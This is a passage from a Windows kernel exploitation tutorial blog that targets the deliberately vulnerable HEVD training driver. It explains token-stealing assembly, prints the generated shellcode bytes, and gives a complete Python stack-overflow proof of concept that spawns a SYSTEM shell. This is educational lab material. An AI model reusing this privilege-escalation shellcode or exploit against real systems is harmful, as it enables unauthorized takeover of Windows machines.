<p>We&rsquo;re gonna need shellcode, however we can&rsquo;t just use any shellcode. Since we&rsquo;re running under the context of the kernel one wrong move directly correlates to a blue screen of death (BSOD). To reach our goal, we&rsquo;re going to be using a technique known as <strong>Token Stealing</strong>. Using this technique, we&rsquo;ll be copying a token with SYSTEM privileges to our current process.</p>
<p>Luckily for us HEVD comes with a few Payloads including this one. Let&rsquo;s take a look at it within <em>Payloads.c</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">186</span> VOID <span style="color:#a6e22e">TokenStealingPayloadWin7Generic</span>() {
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">187</span>     <span style="color:#75715e">// No Need of Kernel Recovery as we are not corrupting anything
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">188</span>     <span style="color:#66d9ef">__asm</span> {
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">189</span>         pushad                               ; Save registers state
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">190</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">191</span>         ; Start of Token Stealing Stub       
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">192</span>         xor eax, eax                         ; Set ZERO
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">193</span>         mov eax, fs:[eax <span style="color:#f92672">+</span> KTHREAD_OFFSET]   ; Get nt<span style="color:#f92672">!</span>_KPCR.PcrbData.CurrentThread
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">194</span>                                              ; _KTHREAD is located at FS:[<span style="color:#ae81ff">0x124</span>]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">195</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">196</span>         mov eax, [eax <span style="color:#f92672">+</span> EPROCESS_OFFSET]     ; Get nt<span style="color:#f92672">!</span>_KTHREAD.ApcState.Process
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">197</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">198</span>         mov ecx, eax                         ; Copy current process _EPROCESS structure
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">199</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">200</span>         mov edx, SYSTEM_PID                  ; WIN <span style="color:#ae81ff">7</span> SP1 SYSTEM process PID <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">201</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">202</span>         SearchSystemPID:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">203</span>             mov eax, [eax <span style="color:#f92672">+</span> FLINK_OFFSET]    ; Get nt<span style="color:#f92672">!</span>_EPROCESS.ActiveProcessLinks.Flink
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">204</span>             sub eax, FLINK_OFFSET
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">205</span>             cmp [eax <span style="color:#f92672">+</span> PID_OFFSET], edx      ; Get nt<span style="color:#f92672">!</span>_EPROCESS.UniqueProcessId
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">206</span>             jne SearchSystemPID
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">207</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">208</span>         mov edx, [eax <span style="color:#f92672">+</span> TOKEN_OFFSET]        ; Get SYSTEM process nt<span style="color:#f92672">!</span>_EPROCESS.Token
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">209</span>         mov [ecx <span style="color:#f92672">+</span> TOKEN_OFFSET], edx        ; Replace target process nt<span style="color:#f92672">!</span>_EPROCESS.Token
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">210</span>                                              ; with SYSTEM process nt<span style="color:#f92672">!</span>_EPROCESS.Token
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">211</span>         ; End of Token Stealing Stub
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">212</span>         
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">213</span>         popad                                ; Restore registers state
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">214</span>     }
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">215</span> }
</span></span></code></pre></div><p>Let&rsquo;s break this down line by line. On line <em>193</em> we clear out the EAX register. Next on line <em>193</em> we use the <em>FS</em> register to get the address of the current thread located at offset 0x124. We can see this within WinDbg.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/thread_7.png" alt="alt text"></p>
<p>Let&rsquo;s map out the structure, first we need the base address of the <em>PCR (Processor Control Region)</em>, also known as the <em>_KPCR</em> from there we can easily traverse the structure and find the current thread.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/map_7.png" alt="alt text"></p>
<p>Next, we need to find the address of the <em>_EPROCESS data structure (&ldquo;Executive Process&rdquo;)</em>. Each running process on a Windows system is associated with an EPROCESS structure. We can do this just like we did the _KCPR.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocess_7.png" alt="alt text"></p>
<p>Now let&rsquo;s look at the next block of code within this Payload (Feel free to just follow along. At this point I began writing the shellcode stub):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>         SearchSystemPID:
</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">FLINK_OFFSET</span>]    <span style="color:#75715e">; Get nt!_EPROCESS.ActiveProcessLinks.Flink
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             <span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">FLINK_OFFSET</span>
</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">PID_OFFSET</span>], <span style="color:#66d9ef">edx</span>      <span style="color:#75715e">; Get nt!_EPROCESS.UniqueProcessId
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">SearchSystemPID</span>
</span></span></code></pre></div><p>Here we&rsquo;re extracting the <em>forward link (FLINK) pointer</em> from the current <em>_EPROCESS structure</em>, then subtracting the offset to the FLINK from EAX to have EAX then point to the next _EPROCESS structure in the linked list. We then compare the process ID of the _EPROCESS structure to 0x04 and if it&rsquo;s not found we continue searching until we find a SYSTEM process.</p>
<p>Once we find a process, we simply replace the current processes token. This is almost like an egghunter but for tokens.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>         <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>]        <span style="color:#75715e">; Get SYSTEM process nt!_EPROCESS.Token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>         <span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#66d9ef">TOKEN_OFFSET</span>], <span style="color:#66d9ef">edx</span>        <span style="color:#75715e">; Replace target process nt!_EPROCESS.Token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                              <span style="color:#75715e">; with SYSTEM process nt!_EPROCESS.Token
</span></span></span></code></pre></div><p>The full code can be seen below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">BITS</span> <span style="color:#ae81ff">32</span>      ]
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">SECTION</span> <span style="color:#66d9ef">.text</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_start:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pushad</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; set ZERO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">fs</span>:[<span style="color:#66d9ef">eax</span><span style="color:#960050;background-color:#1e0010">+</span><span style="color:#ae81ff">0x124</span>]     <span style="color:#75715e">; nt!_KPCR.PcrbData.CurrentThread
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0x50</span>]             <span style="color:#75715e">; nt!_KTHREAD.ApcState.Process
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">eax</span>                      <span style="color:#75715e">; Copy current process _EPROCESS structure
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#ae81ff">0x04</span>                     <span style="color:#75715e">; WIN 10 SYSTEM PROCESS PID
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>	SearchSystemPID:
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb8</span>]         <span style="color:#75715e">; nt!_EPROCESS.ActiveProcessLinks.Flink
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">sub</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">0xb8</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">cmp</span> [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xb4</span>], <span style="color:#66d9ef">edx</span>         <span style="color:#75715e">; nt!_EPROCESS.UniqueProcessId
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">SearchSystemPID</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">eax</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>]             <span style="color:#75715e">; Get SYSTEM process nt!_EPROCESS.Token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">mov</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">0xf8</span>], <span style="color:#66d9ef">edx</span>             <span style="color:#75715e">; Replace target process nt!_EPROCESS.Token
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">popad</span>
</span></span></code></pre></div><p>Let&rsquo;s look at this in the debugger, you can generate the shellcode using <em>Sickle</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Bytecode generated by Sickle, size: 52 bytes</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8&#39;</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#39;\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61&#39;</span>
</span></span></code></pre></div><p>Now let&rsquo;s update the PoC as shown below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>GENERIC_READ           <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x80000000</span>
</span></span><span style="display:flex;"><span>GENERIC_WRITE          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40000000</span>
</span></span><span style="display:flex;"><span>OPEN_EXISTING          <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000003</span>
</span></span><span style="display:flex;"><span>FILE_ATTRIBUTE_NORMAL  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000080</span>
</span></span><span style="display:flex;"><span>MEM_COMMIT             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00001000</span>
</span></span><span style="display:flex;"><span>MEM_RESERVE            <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00002000</span>
</span></span><span style="display:flex;"><span>PAGE_EXECUTE_READWRITE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00000040</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NULL <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  kernel32 <span style="color:#f92672">=</span> windll<span style="color:#f92672">.</span>kernel32
</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>CreateFileA(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                               (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                               NULL,
</span></span><span style="display:flex;"><span>                               OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                               FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                               NULL)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># python3 sickle.py -p windows/x86/kernel_token_stealer -f python3 -v shellcode</span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># Bytecode generated by Sickle, size: 52 bytes</span>
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">=</span> bytearray()
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>  shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x89\x91\xf8\x00\x00\x00\x61</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Allocating RWX memory&#34;</span>)
</span></span><span style="display:flex;"><span>  ptrMemory <span style="color:#f92672">=</span> kernel32<span style="color:#f92672">.</span>VirtualAlloc(NULL,
</span></span><span style="display:flex;"><span>                                    len(shellcode),
</span></span><span style="display:flex;"><span>                                    (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
</span></span><span style="display:flex;"><span>                                    PAGE_EXECUTE_READWRITE)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Creating a char array to house shellcode&#34;</span>)
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> (c_char <span style="color:#f92672">*</span> len(shellcode))<span style="color:#f92672">.</span>from_buffer(shellcode)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Copying shellcode array into RWX memory&#34;</span>)
</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>RtlMoveMemory(c_int(ptrMemory), buffer, len(shellcode))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  ptrShellcode <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, ptrMemory)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  buffer  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2080</span>
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">+=</span> ptrShellcode
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;[*] Calling control code 0x222003&#34;</span>)
</span></span><span style="display:flex;"><span>  kernel32<span style="color:#f92672">.</span>DeviceIoControl(hHEVD,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x222003</span>,
</span></span><span style="display:flex;"><span>                           buffer,
</span></span><span style="display:flex;"><span>                           len(buffer),
</span></span><span style="display:flex;"><span>                           NULL,
</span></span><span style="display:flex;"><span>                           <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                           byref(c_ulong()),
</span></span><span style="display:flex;"><span>                           NULL)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main()
</span></span></code></pre></div><p>Since we&rsquo;re gonna be overwriting the return address, let&rsquo;s break at <strong>BASE+OFFSET</strong>. We can get this from Ghidra.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/ret_7.png" alt="alt text"></p>
<p>Now let&rsquo;s apply this to WinDbg.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/offset-ret_7.png" alt="alt text"></p>
<p>With the breakpoint set, let&rsquo;s launch our exploit on the target machine. Once the breakpoint is hit, we can see that we&rsquo;re about to return the allocated memory region and execute our shellcode (52 bytes).</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/bp1_7.png" alt="alt text"></p>
<p>Let&rsquo;s step into this (<em>t</em>) until we hit <strong>mov edx, 0x04</strong>. Once here <em>ECX</em> and <em>EAX</em> should contain pointers to <em>_EPROCESS</em>.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/eprocEAX.png" alt="alt text"></p>
<p>The next instruction moves the FLINK pointer into EAX.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/flink_ptr_7.png" alt="alt text"></p>
<p>Once done <strong>sub eax, 0xb8</strong> executes (since we&rsquo;re traversing active processes). This effectively positions eax to the start of the next _EPROCESS structure.</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/next_eproc_7.png" alt="alt text"></p>
<p>Let&rsquo;s set a breakpoint here and continue execution until the process <em>_EPROCESS.UniqueProcessId</em> is 0x04 (I did it raw so if we reboot it likely won&rsquo;t resolve). Once found we can see that the jump won&rsquo;t be executed!</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/npjmp.png" alt="alt text"></p>
<p>Now the code simply copies the token into our current _EPROCESS structure! It appears I was wrong in the last couple of notes this can be found in the owning process!</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/owning_7.png" alt="alt text"></p>
<p>So, the reality is we don&rsquo;t need to look too far once we have the current thread&hellip; I was confused but it makes total sense now. Below is screenshot to recap!</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/recap_7.png" alt="alt text"></p>
<p>Now we can continue to execute our shellcode, but we get a segfault. Why?</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/crash_7.png" alt="alt text"></p>
<h2 id="fixing-the-crash">Fixing The Crash</h2>
<p>Looking at the state of registers it appears EBP is still corrupted. However more importantly we never return, let&rsquo;s add a ret instruction to the shellcode and place a valid address into EBP and try again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wetw0rk㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/Sickle/src<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 sickle.py -a x86 -m asm_shell -f c                                            
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ASM Shell loaded <span style="color:#66d9ef">for</span> x86 architecture
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sickle &gt; a pop ebp
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x5d&#34;</span> // pop ebp
</span></span><span style="display:flex;"><span>sickle &gt; a ret
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xc3&#34;</span> // ret
</span></span></code></pre></div><p>Once we update the PoC and send it, we still get a segfault. So, I decided to look at Ghidra and you can see that the ret operations is <em>RET 0x8</em>. Let&rsquo;s try it!</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/lr_7.png" alt="alt text"></p>
<p>Once sent, we have SYSTEM!</p>
<p><img src="/0x00-Introduction-To-Windows-Kernel-Exploitation/poc.gif" alt="alt text"></p>
<h1 id="sources">Sources</h1>
<pre tabindex="0"><code>https://www.welivesecurity.com/2017/03/27/configure-windbg-kernel-debugging/
https://microsoft.public.windbg.narkive.com/MamhR9YH/win7-and-kpcr
https://github.com/LordNoteworthy/windows-internals/blob/master/IRP%20Major%20Functions%20List.md
https://youtu.be/Ca3dAXDdoz8?si=oN_DsgyLz-Z4fVYL
</code></pre>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
